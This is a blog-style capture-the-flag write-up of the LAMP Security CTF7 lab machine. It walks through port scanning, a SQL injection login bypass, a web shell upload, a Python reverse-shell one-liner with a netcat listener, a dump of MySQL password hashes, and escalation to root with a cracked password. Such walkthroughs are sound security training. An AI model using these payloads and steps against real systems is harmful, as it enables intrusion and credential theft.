---
layout: post
title:	"Lamp Security CTF7 Writeup"
date:	2017-01-06 21:30:00
categories:
    - blog
tags:
    - vulnhub
---

Hello everyone. [LAMP Security CTF7](http://www.vulnhub.com/entry/lampsecurity-ctf7,86/) was created by [Mad Irish](http://hello%20everyone.%20lamp%20security%20ctf7%20is%20an%20easy%20and%20funny%20ctf%20created%20by%20mad%20irish/). You can find it on [Vulnub](https://www.vulnhub.com/) or on [root-me](https://www.root-me.org/).

Ok let’s start to enumerate the services:

~~~
syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
Device type: general purpose|storage-misc|broadband router|media device|WAP
~~~

I ran dirsearch and in the meanwhile I seen the web site on port 80:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img1.png)

On port 8080 there was this login:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img2.png)

The login was vulneable to SQL Injection. I logged in with ‘ or 1=1 — -. There was a kind of CMS:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img3.png)

I uploaded a shell by creating a new reading:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img4.png)

Before that, Dirsearch showed me the directory with all the uploaded files:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img5.png)

Ok the shell worked:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img6.png)

I used this python payload to open a reverse shell:

~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
(["/bin/sh","-i"]);'
~~~

And it worked:

~~~
syrion@backbox:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [212.83.142.84] port 4444 [tcp/*] accepted (family 2, sport 57758)
sh: no job control in this shell
sh-4.1$ python -c “import pty;pty.spawn(‘/bin/bash’);”
python -c “import pty;pty.spawn(‘/bin/bash’);”
bash-4.1$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
~~~

After some local enumerations, I found the credentials of mysql in a php page, so I accessed to mysql and I found some interesting credentials:

~~~
bash-4.1$ mysql -u root
mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 26
Server version: 5.1.66 Source distribution
Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.

mysql> show databases;
show databases;
+——————–+
| Database           |
+——————–+
| information_schema |
| mysql              |
| roundcube          |
| website            |
+——————–+
4 rows in set (0.00 sec)

mysql> use website;
use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+——————-+
| Tables_in_website |
+——————-+
| contact           |
| documents         |
| hits              |
| log               |
| newsletter        |
| payment           |
| trainings         |
| trainings_x_users |
| users             |
+——————-+
9 rows in set (0.00 sec)

mysql> select username,password from users;
select username,password from users;
+——————————-+———————————-+
| username                      | password                         |
+——————————-+———————————-+
| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |
| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |
| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |
| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |
| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |
| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |
| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |
| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |
| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |
| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |
| test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |
+——————————-+———————————-+
12 rows in set (0.00 sec)
~~~

I used Crackstation to crack all the hashes:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img7.png)

At this point I tried to become the user brian:

~~~
bash-4.1$ su brian
su brian
Password: my2cents
[brian@localhost inc]$ id
id
uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin) context=system_u:system_r:httpd_t:s0
~~~

The user Brian was a sudo user, and I become root:

~~~
[brian@localhost inc]$ sudo su
sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.

[sudo] password for brian: my2cents

[root@localhost inc]# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
[root@localhost inc]# cat /passwd
cat /passwd
688986705024f447914a24e0dd903b39
~~~

Bye!
